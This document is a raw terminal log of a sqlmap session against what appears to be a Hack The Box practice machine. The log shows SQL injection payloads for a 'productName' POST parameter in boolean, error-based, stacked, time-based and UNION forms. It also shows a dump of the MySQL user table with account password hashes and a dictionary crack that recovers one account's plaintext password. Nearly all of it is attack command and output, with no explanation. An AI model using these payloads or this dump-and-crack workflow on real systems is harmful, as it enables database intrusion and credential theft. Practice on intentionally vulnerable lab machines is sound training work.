sqlmap -r /root/Desktop/htb/htb-machines/htb-control/post-request.txt --dbms=MySQL -D mysql -T user -C User,Password --dump
        ___
       __H__                                                                                                                                        
 ___ ___[(]_____ ___ ___  {1.4.2.42#dev}                                                                                                            
|_ -| . [']     | .'| . |                                                                                                                           
|___|_  ["]_|_|_|__,|  _|                                                                                                                           
      |_|V...       |_|   http://sqlmap.org                                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:23:53 /2020-04-06/

[04:23:53] [INFO] parsing HTTP request from '/root/Desktop/htb/htb-machines/htb-control/post-request.txt'
[04:23:53] [WARNING] provided value for parameter 'productName' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[04:23:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-8145' OR 9586=9586#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=' AND (SELECT 8418 FROM(SELECT COUNT(*),CONCAT(0x716a707171,(SELECT (ELT(8418=8418,1))),0x7178707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- yRDW

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: productName=';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=' AND (SELECT 3153 FROM (SELECT(SLEEP(5)))kpYr)-- kJkh

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716a707171,0x4e706b754b4c6162427569724f447067515471477367785075666b614e78704c4441657857657176,0x7178707871),NULL#
---
[04:23:54] [INFO] testing MySQL
[04:23:54] [INFO] confirming MySQL
[04:23:54] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 10 or 2016
web application technology: Microsoft IIS 10.0, PHP 7.3.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[04:23:54] [INFO] fetching entries of column(s) '`Password`, `User`' for table 'user' in database 'mysql'
[04:23:54] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[04:23:55] [INFO] retrieved: '*0E178792E8FC304A2E3133D535D38CAF1DA3CD9D','hector'
[04:23:55] [INFO] retrieved: '*CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA','manager'
[04:23:55] [INFO] retrieved: '*0A4A5CAD344718DC418035A1F4D292BA603134D8','root'
[04:23:55] [INFO] retrieved: '*0A4A5CAD344718DC418035A1F4D292BA603134D8','root'
[04:23:55] [INFO] retrieved: '*0A4A5CAD344718DC418035A1F4D292BA603134D8','root'
[04:23:56] [INFO] retrieved: '*0A4A5CAD344718DC418035A1F4D292BA603134D8','root'
[04:23:56] [INFO] recognized possible password hashes in column '`Password`'                                                                       
n
y
[04:24:09] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
2
what's the custom dictionary's location?
> /usr/share/wordlists/rockyou.txt
[04:24:46] [INFO] using custom dictionary
[04:24:46] [CRITICAL] there was a problem while loading dictionaries ('unable to read file '/y/usr/share/wordlists/rockyou.txt'')
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> /usr/share/wordlists/rockyou.txt
[04:24:56] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[04:25:00] [INFO] starting dictionary-based cracking (mysql_passwd)
[04:25:00] [INFO] starting 4 processes 
[04:25:19] [INFO] cracked password 'l3tm3!n' for hash '*cfe3eee434b38cbf709ad67a4dcdea476cba7fda'                                                  
Database: mysql                                                                                                                                    
Table: user
[6 entries]
+---------+-----------------------------------------------------+
| User    | Password                                            |
+---------+-----------------------------------------------------+
| hector  | *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D           |
| manager | *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA (l3tm3!n) |
| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8           |
| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8           |
| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8           |
| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8           |
+---------+-----------------------------------------------------+

[04:25:43] [INFO] table 'mysql.`user`' dumped to CSV file '/root/.sqlmap/output/10.10.10.167/dump/mysql/user.csv'
[04:25:43] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.167'

[*] ending @ 04:25:43 /2020-04-06/
